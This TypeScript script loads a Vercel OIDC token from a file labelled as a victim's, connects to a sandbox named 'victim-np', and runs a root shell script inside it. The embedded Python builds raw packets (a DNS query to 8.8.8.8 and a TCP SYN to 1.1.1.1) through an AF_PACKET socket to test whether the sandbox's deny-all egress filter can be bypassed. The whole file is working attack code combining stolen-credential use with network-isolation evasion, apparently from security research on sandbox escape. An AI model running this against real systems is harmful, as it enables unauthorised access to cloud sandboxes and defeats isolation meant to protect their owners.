import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

const EXPLORE = `#!/bin/bash
set +e
echo "=== deny-all check ==="
timeout 3 curl -s -o /dev/null -w "code=%{http_code}\\n" --max-time 2 http://1.1.1.1/ 2>&1 | head -2
echo "=== DNS raw probe + filtered sniff ==="
timeout 12 python3 - <<'PYEOF'
import socket, struct, time, select, subprocess, binascii, random
out = subprocess.check_output(["ip","-4","addr","show","eth0"]).decode()
myip = ""
for line in out.splitlines():
    if "inet " in line:
        myip = line.strip().split()[1].split("/")[0]
mac = open("/sys/class/net/eth0/address").read().strip()
arp = open("/proc/net/arp").read()
gmac = None
for line in arp.splitlines()[1:]:
    p = line.split()
    if p[0] == "100.64.0.1":
        gmac = p[3]
print("myip", myip, "mac", mac, "gw", gmac, flush=True)
gwmac = binascii.unhexlify(gmac.replace(":","")) if gmac else b"\\xff"*6
mymac = binascii.unhexlify(mac.replace(":",""))
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
s.bind(("eth0",0))
tid = random.randint(0,65535)
q = b"\\x07example\\x03com\\x00"
dns = struct.pack("!HHHHHH", tid, 0x0100, 1, 0, 0, 0) + q + struct.pack("!HH", 1, 1)
sport = random.randint(10000,60000)
udp = struct.pack("!HHHH", sport, 53, 8+len(dns), 0) + dns
tot = 20 + len(udp)
ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, tot, 0x9999, 0, 64, 17, 0,
                 socket.inet_aton(myip), socket.inet_aton("8.8.8.8"))
frame = gwmac + mymac + struct.pack("!H", 0x0800) + ip + udp
try:
    s.send(frame)
    print("DNS UDP sent to 8.8.8.8:53 tid=%d sport=%d" % (tid, sport), flush=True)
except Exception as e:
    print("send err", e, flush=True)
seen = {}
icmp_seen = {}
end = time.time()+8
while time.time() < end:
    r,_,_ = select.select([s],[],[],0.5)
    if not r: continue
    try: data = s.recv(65535)
    except Exception: continue
    if len(data) < 42: continue
    eth = data[:14]
    if eth[12:14] != b"\\x08\\x00": continue
    iph = data[14:34]
    srcip = socket.inet_ntoa(iph[12:16]); dstip = socket.inet_ntoa(iph[16:20])
    proto = iph[9]
    if proto == 17:
        udph = data[34:42]
        sp, dp = struct.unpack("!HH", udph[0:4])
        if sp == 53 and dp == sport:
            print("*** DNS RESPONSE from %s tid=%d ***" % (srcip, tid), flush=True)
            print("DNS payload:", data[42:min(len(data),42+100)], flush=True)
            seen["dns"] = seen.get("dns",0)+1
    elif proto == 6:
        tcph = data[34:54]
        sp, dp = struct.unpack("!HH", tcph[0:4])
        flags = tcph[13]
        if dp == sport:
            print("*** TCP reply from %s:%d -> dstport %d flags=0x%02x ***" % (srcip, sp, dp, flags), flush=True)
            seen["tcp"] = seen.get("tcp",0)+1
    elif proto == 1:
        typ, code = data[34], data[35]
        key = "%s:%d:%d" % (srcip, typ, code)
        icmp_seen[key] = icmp_seen.get(key,0)+1
        if icmp_seen[key] <= 3:
            print("ICMP from %s type=%d code=%d" % (srcip, typ, code), flush=True)
print("SUMMARY dns_resp=%s tcp_reply=%s icmp=%s" % (seen.get("dns",0), seen.get("tcp",0), dict(icmp_seen)), flush=True)
PYEOF
echo "=== TCP SYN raw probe + filtered sniff ==="
timeout 10 python3 - <<'PYEOF'
import socket, struct, time, select, subprocess, binascii, random
out = subprocess.check_output(["ip","-4","addr","show","eth0"]).decode()
myip = ""
for line in out.splitlines():
    if "inet " in line:
        myip = line.strip().split()[1].split("/")[0]
mac = open("/sys/class/net/eth0/address").read().strip()
arp = open("/proc/net/arp").read()
gmac = None
for line in arp.splitlines()[1:]:
    p = line.split()
    if p[0] == "100.64.0.1":
        gmac = p[3]
gwmac = binascii.unhexlify(gmac.replace(":","")) if gmac else b"\\xff"*6
mymac = binascii.unhexlify(mac.replace(":",""))
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
s.bind(("eth0",0))
seq = random.randint(0,0xffffffff)
sport = random.randint(10000,60000)
tcp = struct.pack("!HHIIHHHH", sport, 443, seq, 0, 0x5002, 65535, 0, 0)
ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 40, 0x7777, 0, 64, 6, 0,
                 socket.inet_aton(myip), socket.inet_aton("1.1.1.1"))
frame = gwmac + mymac + struct.pack("!H", 0x0800) + ip + tcp
try:
    s.send(frame)
    print("TCP SYN sent to 1.1.1.1:443 sport=%d seq=%d" % (sport, seq), flush=True)
except Exception as e:
    print("send err", e, flush=True)
seen = {}
icmp_seen = {}
end = time.time()+6
while time.time() < end:
    r,_,_ = select.select([s],[],[],0.5)
    if not r: continue
    try: data = s.recv(65535)
    except Exception: continue
    if len(data) < 54: continue
    eth = data[:14]
    if eth[12:14] != b"\\x08\\x00": continue
    iph = data[14:34]
    srcip = socket.inet_ntoa(iph[12:16]); dstip = socket.inet_ntoa(iph[16:20])
    proto = iph[9]
    if proto == 6:
        tcph = data[34:54]
        sp, dp = struct.unpack("!HH", tcph[0:4])
        flags = tcph[13]
        if dp == sport:
            print("*** TCP reply from %s:%d flags=0x%02x ***" % (srcip, sp, flags), flush=True)
            seen["tcp"] = seen.get("tcp",0)+1
            if flags & 0x12: print("*** SYN-ACK/RST-ACK ***", flush=True)
    elif proto == 1:
        typ, code = data[34], data[35]
        key = "%s:%d:%d" % (srcip, typ, code)
        icmp_seen[key] = icmp_seen.get(key,0)+1
        if icmp_seen[key] <= 3:
            print("ICMP from %s type=%d code=%d" % (srcip, typ, code), flush=True)
print("SUMMARY tcp_reply=%s icmp=%s" % (seen.get("tcp",0), dict(icmp_seen)), flush=True)
PYEOF
echo DONE`;

const SCRIPT = `set +e
cat > /tmp/explore28.sh <<'EXPLORE_EOF'
${EXPLORE}
EXPLORE_EOF
sudo unshare -m --propagation private bash /tmp/explore28.sh 2>&1
echo "=== rc: $? ==="
`;

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", SCRIPT], { sudo: true, wait: true, timeout: 120_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });
